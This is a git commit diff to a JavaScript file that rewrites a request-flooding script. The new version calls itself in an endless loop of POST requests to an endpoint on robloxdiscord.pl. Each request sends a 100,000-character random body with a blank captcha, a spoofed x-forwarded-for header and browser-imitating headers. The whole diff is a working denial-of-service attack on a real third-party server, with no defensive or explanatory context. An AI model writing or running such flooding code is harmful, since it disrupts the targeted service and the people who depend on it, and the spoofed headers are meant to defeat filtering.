f78c14cd8574e3110e66ab4949c8f61aca01adbe
Sircut12 <111530136+Sircut12@users.noreply.github.com>
2022-08-18 23:36:50 +0200

    Update index.js

--- index.js
+++ index.js
@@ -16,22 +16,25 @@ function makeid(length) {
     }
     return result;
     }
-    setInterval(()=>{
-        fetch("https://api-bytow.robloxdiscord.pl/egg", {
-            "credentials": "omit",
-            "headers": {
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
-                "Accept": "*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-site",
-                "x-forwarded-for": "0.24.11.5"
-            },
-            "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
-            "body": "num1="+makeid(100000)+"&captcha=",
-            "method": "POST",
-            "mode": "cors"
-        })
-    }, 10)
+
+
+function rawr(){
+fetch("https://api-bytow.robloxdiscord.pl/egg", {
+    "credentials": "omit",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site",
+        "x-forwarded-for": "0.24.11.5"
+    },
+    "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
+    "body": "num1="+makeid(100000)+"&captcha=",
+    "method": "POST",
+    "mode": "cors"
+}).then(e=>{rawr()})
+}
+rawr()
